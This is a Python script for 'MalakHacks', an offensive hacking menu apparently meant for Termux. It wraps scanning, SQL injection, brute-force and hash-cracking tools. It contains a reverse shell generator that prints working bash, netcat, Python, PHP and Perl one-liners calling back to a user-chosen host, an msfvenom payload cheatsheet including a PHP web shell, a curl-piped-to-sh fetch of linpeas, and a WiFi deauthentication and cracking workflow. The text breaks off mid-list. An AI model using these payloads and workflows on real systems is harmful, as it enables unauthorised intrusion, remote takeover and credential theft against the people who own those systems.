#!/usr/bin/env python3

import os
import sys
import subprocess
import socket
import hashlib
import base64
import random
import shutil
import urllib.request
import json
import time

# ==================== COLORS ====================

class C:
    PINK    = '\033[95m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    RED     = '\033[91m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    END     = '\033[0m'

# ==================== HELLO KITTY LOGOS ====================

HK1 = f"""
{C.PINK}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣄⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀
⠀⠀⠀⢠⡾⠛⠳⠶⣤⣀⣠⣤⣤⣴⡟⠁⠀⠙⣷⠟⠋⠉⠉⢿⡀⠀⠀⠀
⠀⠀⠀⣾⠁⠀⠀⠀⠀⠉⠀⠀⠀⡿⠀⢠⣟⣿⠿⠳⢦⣤⡴⣼⣇⠀⠀⠀
⠀⠀⠀⢻⣤⠀⠀⠀⠀⠀⠀⠀⠀⢿⣄⣀⣽⣏⠀⠀⢸⣷⡄⠀⣿⠀⠀⠀
⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠉⠓⢾⡟⠛⢁⣼⣟⠀⠀⠀
⠀⢀⣼⣇⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣙⣿⣿⣥⣽⢤⠀⠀
⣀⣈⣷⣏⣁⠀⠀⢀⠀⠉⠙⠻⣶⣾⣳⣶⠟⠉⠁⢀⠀⠀⠀⠶⢻⡟⠒⠒
⠀⠀⠸⣇⣀⠀⠀⠛⠉⠂⠀⢀⡿⣉⣉⢿⡄⠀⠒⠉⠋⠀⠀⠠⣼⠧⢤⠀
⠀⠐⠛⠻⣍⣀⡀⠀⠀⢀⣠⠞⠙⠧⠼⠈⠳⣄⡀⠀⠀⠀⣠⣴⣟⡀⠀⠀
⠀⠀⣠⠴⠛⢿⣭⠿⠿⢯⡅⠀⠀⠀⠀⠀⠀⣠⣭⣩⣭⣭⣿⣋⠈⠙⠂⠀
⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⣿⠶⠶⠶⠤⠶⣾⠇⠀⠘⣧⠀⠀⢹⡇⠀⠀⠀
⠀⠀⠀⠀⠸⣇⠀⠀⣰⠾⠋⠀⠀⠀⠀⠀⣧⡀⠀⠀⢿⣄⣤⡾⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠈⠛⠒⠒⠚⠋⠁⠀⠀⠀⠀{C.END}
"""

HK2 = f"""
{C.PINK}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⢶⣶⣄⠀⣠⣴⣾⠿⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣾⠋⠀⠀⠈⠹⣿⡟⠉⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⠟⠉⠉⠉⠛⠻⢿⣶⠿⠿⠟⠛⠛⠛⣿⠇⠀⢠⣶⣶⣶⣿⣷⣦⣤⣀⣠⣤⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⢸⣿⣼⡿⠁⠀⠀⠙⣿⣯⡁⠀⠈⢿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣄⠀⠀⢙⣿⣷⡀⠀⠀⢠⣿⣿⣿⡆⠀⣾⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠋⠙⠻⠷⠾⣿⡟⠛⠋⠀⣴⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⡶⠿⠛⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣹⣷⣤⣤⣤⡄
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⡀⠀⠀⠀⠘⠋⢹⣿⠀⠀⠀⠀
⠀⣀⣀⣤⣿⣧⣤⡄⠀⠀⠀⢀⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡷⠀⠀⠀⠀⢠⣼⣿⣤⣤⡤⠀
⠈⠛⠉⠉⠹⣿⠀⠀⠀⠀⠀⠸⣿⡿⠀⠀⠀⠀⠀⢀⣠⡤⣤⡀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⢀⣾⠏⠀⠀⠀⠀{C.END}
"""

HK3 = f"""
{C.PINK}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠶⢦⣄⠀⠀⠀⠀⠀⣴⠟⠛⢧⣠⣶⣿⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⡟⠦⠌⠛⠉⠉⠉⢹⠇⢠⣶⣼⣷⣞⢙⣧⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣤⠃⠀⠀⠀⠀⠀⠀⣿⠀⠈⢻⡃⠀⢸⡿⡄⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠘⠷⠖⠛⠛⠛⢿⡗⢋⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⢻⡀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠾⣷⠆⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠐⢺⡟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⢿⡦⠀⠀⠛⠃⠀⠀⢠⢶⣄⠀⠀⠈⠛⠀⠀⠀⣺⠓⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣖⡀⣀⣀⡀⠀⠈⠉⠉⠀⠀⣀⣀⣀⠀⣲⣯⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⡆
⢻⡈⠻⣦⣀⣀⣀⣀⣀⠀⠀⠀⠁⣴⠟⠉⠁⠀⠉⠛⢦⡀⢀⡴⠛⠉⠁⠈⠙⠻⣄⠀⠁⣀⣠⣤⣤⣤⣤⡤⠖⠋⣸⠇
⡿⠳⣤⣀⡀⠀⠀⠉⠉⠉⠳⢦⣼⠃⠀⠀⠀⠀⠀⠀⠀⠿⠋⠀⠀⠀⠀⠀⠀⠀⠹⣦⡞⠉⠀⠀⠀⠀⠀⢀⣠⠶⢻⡆{C.END}
"""

HK4 = (
    "\n" + C.PINK +
    "  /\\_____/\\\n"
    " /  o   o  \\      MalakHacks\n"
    "( ==  ^  == )     by ur frnd EL4Q\n"
    " )         (      for malak\n"
    "(           )\n"
    " \\ _______/\n"
    "  coo coo\n" +
    C.END + "\n"
)

HELLO_KITTYS = [HK1, HK2, HK3, HK4]

# ==================== UTILS ====================

def run_cmd(cmd_list, timeout=120):
    """Safe subprocess runner using list args (no shell injection)."""
    try:
        result = subprocess.run(
            cmd_list,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        out = result.stdout.strip()
        err = result.stderr.strip()
        if out:
            return out
        if err:
            return err
        return f"[done, no output]"
    except FileNotFoundError:
        return f"{C.RED}[!] Tool not found: {cmd_list[0]}{C.END}\n{C.YELLOW}    Install: pkg install {cmd_list[0]}{C.END}"
    except subprocess.TimeoutExpired:
        return f"{C.YELLOW}[!] Timed out after {timeout}s{C.END}"
    except Exception as e:
        return f"{C.RED}[!] Error: {e}{C.END}"

def check_tool(tool):
    """Check if a binary exists on PATH."""
    return shutil.which(tool) is not None

def tool_status(tool):
    if check_tool(tool):
        return f"{C.GREEN}✓{C.END}"
    return f"{C.RED}✗{C.END}"

def get_input(prompt, default=None):
    val = input(f"{C.CYAN}{prompt}{C.END}").strip()
    if not val and default:
        return default
    return val

def banner():
    print(random.choice(HELLO_KITTYS))
    print(f"{C.BOLD}{C.PINK}  MalakHacks{C.END}  {C.DIM}a hacking tool just for u Malak{C.END}")
    print(f"  {C.DIM}            V-1 (this is the first version){C.END}\n")

def section(title):
    print(f"\n{C.BOLD}{C.BLUE}━━━ {title} ━━━{C.END}\n")

def ok(msg):    print(f"{C.GREEN}[+]{C.END} {msg}")
def info(msg):  print(f"{C.CYAN}[*]{C.END} {msg}")
def warn(msg):  print(f"{C.YELLOW}[!]{C.END} {msg}")
def err(msg):   print(f"{C.RED}[-]{C.END} {msg}")

# ==================== NETWORK SCANNING ====================

def dns_lookup():
    section("DNS Lookup")
    target = get_input("Domain: ")
    if not target:
        return
    # try socket first (no external tool needed)
    try:
        ip = socket.gethostbyname(target)
        ok(f"{target} → {ip}")
    except socket.gaierror as e:
        err(f"DNS failed: {e}")
    # also try nslookup if available
    if check_tool("nslookup"):
        print(run_cmd(["nslookup", target]))
    elif check_tool("dig"):
        print(run_cmd(["dig", target, "+short"]))

def subdomain_find():
    section("Subdomain Finder")
    target = get_input("Domain: ")
    if not target:
        return
    subs = ["www","mail","ftp","admin","test","dev","api","blog","shop",
            "secure","portal","cpanel","webmail","ns1","ns2","vpn","remote",
            "staging","backup","sql","git","beta","app","m","mobile","auth"]
    found = 0
    info(f"Checking {len(subs)} subdomains...")
    for sub in subs:
        full = f"{sub}.{target}"
        try:
            ip = socket.gethostbyname(full)
            ok(f"{full} → {ip}")
            found += 1
        except:
            pass
    info(f"Done — {found} found")

def port_scan():
    section("Port Scan (nmap)")
    if not check_tool("nmap"):
        warn("nmap not found. Install: pkg install nmap")
        return
    target = get_input("Target IP/domain: ")
    ports  = get_input("Ports [default 1-1000]: ", "1-1000")
    flags  = get_input("Extra flags [e.g. -sV -O, or leave blank]: ", "")
    cmd = ["nmap", "-p", ports]
    if flags:
        cmd += flags.split()
    cmd.append(target)
    info(f"Running: {' '.join(cmd)}")
    print(run_cmd(cmd, timeout=180))

def ping_sweep():
    section("Ping Sweep")
    network = get_input("Network [e.g. 192.168.1.0/24]: ")
    if check_tool("nmap"):
        print(run_cmd(["nmap", "-sn", network], timeout=120))
    else:
        warn("nmap not found. Trying manual ping...")
        base = ".".join(network.split(".")[:3])
        for i in range(1, 255):
            host = f"{base}.{i}"
            r = subprocess.run(["ping", "-c", "1", "-W", "1", host],
                               capture_output=True)
            if r.returncode == 0:
                ok(f"{host} is up")

def traceroute_run():
    section("Traceroute")
    target = get_input("Target: ")
    if check_tool("traceroute"):
        print(run_cmd(["traceroute", target], timeout=60))
    elif check_tool("tracepath"):
        print(run_cmd(["tracepath", target], timeout=60))
    else:
        warn("Neither traceroute nor tracepath found.")
        warn("Install: pkg install traceroute")

def whois_lookup():
    section("WHOIS Lookup")
    target = get_input("Domain or IP: ")
    if not target:
        return
    if check_tool("whois"):
        print(run_cmd(["whois", target]))
    else:
        # fallback: use RDAP API (no tool needed)
        info("whois not installed, using RDAP API fallback...")
        try:
            url = f"https://rdap.verisign.com/com/v1/domain/{target}"
            req = urllib.request.Request(url, headers={"User-Agent": "MalakHacks"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
                ok(f"Name: {data.get('ldhName','?')}")
                for ev in data.get("events", []):
                    ok(f"{ev.get('eventAction','?')}: {ev.get('eventDate','?')}")
                for ns in data.get("nameservers", []):
                    ok(f"NS: {ns.get('ldhName','?')}")
        except Exception as e:
            err(f"RDAP failed: {e}")
            warn("Install whois with: pkg install whois")

def service_detect():
    section("Service Detection")
    if not check_tool("nmap"):
        warn("Install: pkg install nmap"); return
    target = get_input("Target: ")
    print(run_cmd(["nmap", "-sV", "--version-intensity", "5", target], timeout=180))

def os_detect():
    section("OS Detection")
    if not check_tool("nmap"):
        warn("Install: pkg install nmap"); return
    target = get_input("Target: ")
    warn("OS detection may require root on some devices")
    print(run_cmd(["nmap", "-O", target], timeout=180))

# ==================== WEB HACKING ====================

def sqlmap_run():
    section("SQLMap")
    if not check_tool("sqlmap"):
        warn("sqlmap not found.")
        warn("Install: pkg install sqlmap")
        warn("Or: pip install sqlmap")
        return
    url = get_input("Target URL: ")
    level = get_input("Level [1-5, default 1]: ", "1")
    risk  = get_input("Risk  [1-3, default 1]: ", "1")
    extra = get_input("Extra flags [--dbs / --tables / --dump, etc]: ", "--dbs")
    cmd = ["sqlmap", "-u", url, "--batch",
           f"--level={level}", f"--risk={risk}"] + extra.split()
    print(run_cmd(cmd, timeout=300))

def nikto_run():
    section("Nikto Web Scanner")
    if not check_tool("nikto"):
        warn("Install: pkg install nikto"); return
    url = get_input("Target URL: ")
    print(run_cmd(["nikto", "-h", url], timeout=300))

def gobuster_run():
    section("Gobuster Directory Bruteforce")
    if not check_tool("gobuster"):
        warn("Install: pkg install gobuster"); return
    url      = get_input("Target URL: ")
    wordlist = get_input("Wordlist [default /sdcard/wordlists/common.txt]: ",
                         "/sdcard/wordlists/common.txt")
    threads  = get_input("Threads [default 20]: ", "20")
    print(run_cmd(["gobuster", "dir", "-u", url, "-w", wordlist,
                   "-t", threads, "-q"], timeout=300))

def curl_check():
    section("HTTP Header Grab (curl)")
    url = get_input("URL: ")
    print(run_cmd(["curl", "-sI", "--max-time", "10", url]))

def whatweb_run():
    section("WhatWeb — Identify Technologies")
    if not check_tool("whatweb"):
        # fallback with curl
        warn("whatweb not found, using curl header analysis instead...")
        url = get_input("URL: ")
        result = run_cmd(["curl", "-sI", "--max-time", "10", url])
        print(result)
        return
    url = get_input("URL: ")
    print(run_cmd(["whatweb", url]))

def wafw00f_run():
    section("WAF Detection")
    if not check_tool("wafw00f"):
        warn("wafw00f not found. Try: pip install wafw00f")
        return
    url = get_input("URL: ")
    print(run_cmd(["wafw00f", url]))

def ffuf_run():
    section("FFUF Fuzzer")
    if not check_tool("ffuf"):
        warn("ffuf not found. Install: pkg install ffuf"); return
    url      = get_input("URL with FUZZ keyword [e.g. http://site/FUZZ]: ")
    wordlist = get_input("Wordlist: ")
    print(run_cmd(["ffuf", "-u", url, "-w", wordlist, "-c"], timeout=300))

# ==================== PASSWORD ATTACKS ====================

def hashcat_run():
    section("Hashcat")
    if not check_tool("hashcat"):
        warn("Install: pkg install hashcat"); return
    hash_input = get_input("Hash or hash file: ")
    wordlist   = get_input("Wordlist [default rockyou.txt]: ", "rockyou.txt")
    mode       = get_input("Hash mode [0=MD5, 100=SHA1, 1400=SHA256, default 0]: ", "0")
    print(run_cmd(["hashcat", "-m", mode, hash_input, wordlist, "--force"], timeout=600))

def john_run():
    section("John the Ripper")
    if not check_tool("john"):
        warn("Install: pkg install john"); return
    hash_file = get_input("Hash file: ")
    wordlist  = get_input("Wordlist [optional]: ", "")
    cmd = ["john", hash_file]
    if wordlist:
        cmd += ["--wordlist=" + wordlist]
    print(run_cmd(cmd, timeout=600))

def hydra_run():
    section("Hydra Brute Force")
    if not check_tool("hydra"):
        warn("Install: pkg install hydra"); return
    target   = get_input("Target IP/domain: ")
    service  = get_input("Service [ssh/ftp/http-post-form/etc]: ")
    username = get_input("Username [or user file with -L]: ")
    passlist = get_input("Password list: ")
    extra    = get_input("Extra flags [e.g. -t 4]: ", "-t 4")
    cmd = ["hydra", "-l", username, "-P", passlist,
           target, service] + extra.split()
    print(run_cmd(cmd, timeout=600))

def hash_identifier():
    section("Hash Identifier")
    h = get_input("Hash: ")
    length = len(h)
    if length == 32:   ok(f"Likely MD5 (use hashcat -m 0)")
    elif length == 40: ok(f"Likely SHA1 (use hashcat -m 100)")
    elif length == 64: ok(f"Likely SHA256 (use hashcat -m 1400)")
    elif length == 96: ok(f"Likely SHA384 (use hashcat -m 10800)")
    elif length == 128:ok(f"Likely SHA512 (use hashcat -m 1700)")
    elif h.startswith("$2") and length == 60: ok("Likely bcrypt (use hashcat -m 3200)")
    elif h.startswith("$1$"): ok("Likely MD5crypt (use hashcat -m 500)")
    elif h.startswith("$6$"): ok("Likely SHA512crypt (use hashcat -m 1800)")
    else: warn(f"Unknown — length={length}, starts with '{h[:4]}'")

# ==================== EXPLOITATION ====================

def metasploit_menu():
    section("Metasploit Quick Reference")
    if check_tool("msfconsole"):
        info("Metasploit is installed. Launch with: msfconsole")
    else:
        warn("Install: pkg install unstable-repo && pkg install metasploit")
    print(f"""
{C.CYAN}Common workflow:{C.END}
  msfconsole
  search <exploit name>
  use <module>
  show options
  set RHOSTS <target>
  set LHOST <your ip>
  set LPORT <port>
  run

{C.CYAN}Useful modules:{C.END}
  exploit/multi/handler          ← catch reverse shells
  auxiliary/scanner/portscan/tcp ← port scan
  auxiliary/scanner/smb/smb_ms17_010 ← EternalBlue check
""")

def searchsploit_run():
    section("SearchSploit")
    if not check_tool("searchsploit"):
        warn("searchsploit not in standard Termux repo.")
        warn("Clone manually: git clone https://github.com/offensive-security/exploitdb")
        return
    keyword = get_input("Search keyword: ")
    print(run_cmd(["searchsploit", keyword]))

def reverse_shell():
    section("Reverse Shell Generator")
    ip   = get_input("Your listener IP: ")
    port = get_input("Port: ")
    if not ip or not port:
        return
    print(f"""
{C.PINK}━━ Reverse Shell Payloads ━━{C.END}

{C.GREEN}Bash:{C.END}
  bash -i >& /dev/tcp/{ip}/{port} 0>&1

{C.GREEN}Netcat (traditional):{C.END}
  nc -e /bin/sh {ip} {port}

{C.GREEN}Netcat (no -e flag):{C.END}
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {ip} {port} > /tmp/f

{C.GREEN}Python 3:{C.END}
  python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("{ip}",{port})); [os.dup2(s.fileno(),x) for x in range(3)]; subprocess.call(["/bin/sh","-i"])'

{C.GREEN}PHP:{C.END}
  php -r '$s=fsockopen("{ip}",{port}); $p=proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$pi);'

{C.GREEN}Perl:{C.END}
  perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in({port},inet_aton("{ip}"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'

{C.CYAN}Set up listener:{C.END}
  nc -lvnp {port}
""")

def msfvenom_menu():
    section("MSFVenom Payload Cheatsheet")
    ip   = get_input("LHOST (your IP): ", "<LHOST>")
    port = get_input("LPORT: ", "4444")
    print(f"""
{C.PINK}━━ Common Payloads ━━{C.END}

{C.GREEN}Windows EXE:{C.END}
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe

{C.GREEN}Linux ELF:{C.END}
  msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf

{C.GREEN}Android APK:{C.END}
  msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o payload.apk

{C.GREEN}PHP Web Shell:{C.END}
  msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php

{C.GREEN}Python:{C.END}
  msfvenom -p python/shell_reverse_tcp LHOST={ip} LPORT={port}

{C.CYAN}Catch with:{C.END}
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST {ip}
  set LPORT {port}
  run
""")

# ==================== POST EXPLOITATION ====================

def linpeas_run():
    section("LinPEAS — Linux Privesc")
    info("Fetching linpeas.sh from GitHub...")
    print(run_cmd(["bash", "-c",
        "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    ], timeout=300))

def privesc_tips():
    section("Quick Privesc Checklist")
    print(f"""
{C.CYAN}SUID binaries:{C.END}
  find / -perm -u=s -type f 2>/dev/null

{C.CYAN}Sudo rights:{C.END}
  sudo -l

{C.CYAN}Writable paths in PATH:{C.END}
  echo $PATH

{C.CYAN}Cron jobs:{C.END}
  cat /etc/crontab
  ls -la /etc/cron*

{C.CYAN}World-writable files:{C.END}
  find / -writable -type f 2>/dev/null | grep -v proc

{C.CYAN}Active network connections:{C.END}
  netstat -tulpn 2>/dev/null || ss -tulpn
""")

# ==================== FORENSICS ====================

def stego_hide():
    section("Steghide — Hide File in Image")
    if not check_tool("steghide"):
        warn("Install: pkg install steghide"); return
    image  = get_input("Cover image: ")
    secret = get_input("File to hide: ")
    output = get_input("Output image: ")
    print(run_cmd(["steghide", "embed", "-cf", image, "-ef", secret, "-sf", output]))

def stego_extract():
    section("Steghide — Extract Hidden File")
    if not check_tool("steghide"):
        warn("Install: pkg install steghide"); return
    image = get_input("Stego image: ")
    print(run_cmd(["steghide", "extract", "-sf", image]))

def exiftool_run():
    section("ExifTool — Metadata Reader")
    if not check_tool("exiftool"):
        warn("Install: pkg install perl && cpan Image::ExifTool"); return
    file = get_input("File: ")
    print(run_cmd(["exiftool", file]))

def binwalk_run():
    section("Binwalk — Firmware Analysis")
    if not check_tool("binwalk"):
        warn("Install: pip install binwalk"); return
    file = get_input("File: ")
    print(run_cmd(["binwalk", file]))

def strings_run():
    section("Strings — Extract Readable Text")
    file    = get_input("Binary file: ")
    min_len = get_input("Min string length [default 4]: ", "4")
    print(run_cmd(["strings", "-n", min_len, file]))

def file_magic():
    section("File Type Identification")
    file = get_input("File: ")
    print(run_cmd(["file", file]))

def xxd_hex():
    section("Hex Dump")
    file  = get_input("File: ")
    lines = get_input("Lines to show [default 20]: ", "20")
    print(run_cmd(["bash", "-c", f"xxd '{file}' | head -{lines}"]))

# ==================== CRYPTOGRAPHY ====================

def base64_encode():
    section("Base64 Encode")
    text = get_input("Text: ")
    ok(base64.b64encode(text.encode()).decode())

def base64_decode():
    section("Base64 Decode")
    text = get_input("Base64: ")
    try:
        ok(base64.b64decode(text).decode())
    except Exception as e:
        err(f"Invalid base64: {e}")

def md5_hash():
    section("MD5 Hash")
    text = get_input("Text: ")
    ok(hashlib.md5(text.encode()).hexdigest())

def sha1_hash():
    section("SHA1 Hash")
    text = get_input("Text: ")
    ok(hashlib.sha1(text.encode()).hexdigest())

def sha256_hash():
    section("SHA256 Hash")
    text = get_input("Text: ")
    ok(hashlib.sha256(text.encode()).hexdigest())

def rot13_encode():
    section("ROT13")
    text = get_input("Text: ")
    result = ""
    for c in text:
        if 'a' <= c <= 'z': result += chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
        elif 'A' <= c <= 'Z': result += chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
        else: result += c
    ok(result)

def caesar_cipher():
    section("Caesar Cipher")
    text  = get_input("Text: ")
    shift = int(get_input("Shift [default 13]: ", "13"))
    result = ""
    for c in text:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result += chr((ord(c) - base + shift) % 26 + base)
        else:
            result += c
    ok(result)

def xor_cipher():
    section("XOR with single byte key")
    text = get_input("Hex string (e.g. deadbeef): ")
    key  = int(get_input("XOR key (0-255): "), 0)
    try:
        raw = bytes.fromhex(text)
        result = bytes(b ^ key for b in raw)
        ok(f"Hex: {result.hex()}")
        try: ok(f"ASCII: {result.decode()}")
        except: pass
    except Exception as e:
        err(str(e))

def hash_crack_wordlist():
    section("Hash Crack (built-in, no tools needed)")
    target_hash = get_input("Target hash: ").lower()
    wordlist    = get_input("Wordlist file: ")
    algo_input  = get_input("Algorithm [md5/sha1/sha256]: ", "md5").lower()
    algo_map = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}
    if algo_input not in algo_map:
        err("Unknown algorithm"); return
    h_func = algo_map[algo_input]
    info(f"Cracking {algo_input} hash...")
    try:
        with open(wordlist, "r", errors="ignore") as f:
            for i, line in enumerate(f):
                word = line.strip()
                if h_func(word.encode()).hexdigest() == target_hash:
                    ok(f"CRACKED: {word}")
                    return
                if i % 10000 == 0 and i > 0:
                    print(f"\r  {C.DIM}{i} tried...{C.END}", end="", flush=True)
        print()
        warn("Not found in wordlist")
    except FileNotFoundError:
        err(f"Wordlist not found: {wordlist}")

# ==================== OSINT ====================

def geoip():
    section("GeoIP Lookup")
    ip = get_input("IP address: ")
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query"
        req = urllib.request.Request(url, headers={"User-Agent": "MalakHacks"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        if data.get("status") == "success":
            ok(f"IP:      {data.get('query')}")
            ok(f"Country: {data.get('country')}")
            ok(f"Region:  {data.get('regionName')}")
            ok(f"City:    {data.get('city')}")
            ok(f"ISP:     {data.get('isp')}")
            ok(f"Org:     {data.get('org')}")
            ok(f"AS:      {data.get('as')}")
        else:
            err("Lookup failed (private IP or invalid)")
    except Exception as e:
        err(f"Error: {e}")

def dns_records():
    section("DNS Records")
    target = get_input("Domain: ")
    if check_tool("dig"):
        for rtype in ["A", "MX", "NS", "TXT", "CNAME", "AAAA"]:
            result = run_cmd(["dig", target, rtype, "+short"])
            if result.strip():
                ok(f"{rtype}: {result.strip()}")
    elif check_tool("nslookup"):
        print(run_cmd(["nslookup", "-type=ANY", target]))
    else:
        warn("dig/nslookup not found. Install: pkg install dnsutils")
        # fallback with socket
        try:
            a = socket.gethostbyname(target)
            ok(f"A: {a}")
        except: pass

def my_ip():
    section("My IP Info")
    try:
        # external
        req = urllib.request.Request("https://ifconfig.me",
                                     headers={"User-Agent": "curl/7.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            external = r.read().decode().strip()
        ok(f"External IP: {external}")
    except:
        warn("Couldn't fetch external IP")
    # local
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ok(f"Local IP:    {s.getsockname()[0]}")
        s.close()
    except:
        pass

def shodan_lookup():
    section("Shodan Lookup")
    if check_tool("shodan"):
        ip = get_input("IP: ")
        print(run_cmd(["shodan", "host", ip]))
    else:
        ip = get_input("IP: ")
        info("Shodan CLI not installed. Opening via API...")
        try:
            url = f"https://internetdb.shodan.io/{ip}"
            req = urllib.request.Request(url, headers={"User-Agent": "MalakHacks"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            ok(f"IP:    {data.get('ip')}")
            ok(f"Ports: {data.get('ports')}")
            ok(f"Vulns: {data.get('vulns')}")
            ok(f"Hostnames: {data.get('hostnames')}")
            ok(f"Tags:  {data.get('tags')}")
        except Exception as e:
            err(f"Failed: {e}")
            warn("For full Shodan: pip install shodan && shodan init <API_KEY>")

def theharvester_run():
    section("theHarvester")
    if not check_tool("theHarvester") and not check_tool("theharvester"):
        warn("theHarvester not found.")
        warn("Clone: git clone https://github.com/laramies/theHarvester && pip install -r requirements/base.txt")
        return
    domain = get_input("Domain: ")
    binary = "theHarvester" if check_tool("theHarvester") else "theharvester"
    print(run_cmd([binary, "-d", domain, "-b", "all"], timeout=120))

# ==================== WIRELESS ====================

def aircrack_menu():
    section("Aircrack-ng Workflow")
    print(f"""
{C.YELLOW}Note: WiFi monitor mode requires a compatible adapter.{C.END}
{C.YELLOW}Most phones cannot do this without an external USB WiFi adapter + OTG.{C.END}

{C.CYAN}Step 1 — Start monitor mode:{C.END}
  airmon-ng start wlan0

{C.CYAN}Step 2 — Scan for networks:{C.END}
  airodump-ng wlan0mon

{C.CYAN}Step 3 — Capture handshake:{C.END}
  airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon

{C.CYAN}Step 4 — Deauth to force handshake (in another terminal):{C.END}
  aireplay-ng -0 5 -a <AP_MAC> wlan0mon

{C.CYAN}Step 5 — Crack:{C.END}
  aircrack-ng -w /path/to/wordlist.txt capture-01.cap

{C.CYAN}Install:{C.END}
  pkg install aircrack-ng
""")

def bluetooth_scan():
    section("Bluetooth Scan")
    if check_tool("hcitool"):
        print(run_cmd(["hcitool", "scan"], timeout=30))
    else:
        warn("hcitool not found. Install: pkg install bluez")

# ==================== TOOL MANAGER ====================

def tool_checker():
    section("Termux Tool Status")
    tools = [
        ("nmap",         "pkg install nmap"),
        ("sqlmap",       "pkg install sqlmap"),
        ("hydra",        "pkg install hydra"),
        ("john",         "pkg install john"),
        ("hashcat",      "pkg install hashcat"),
        ("nikto",        "pkg install nikto"),
        ("gobuster",     "pkg install gobuster"),
        ("aircrack-ng",  "pkg install aircrack-ng"),
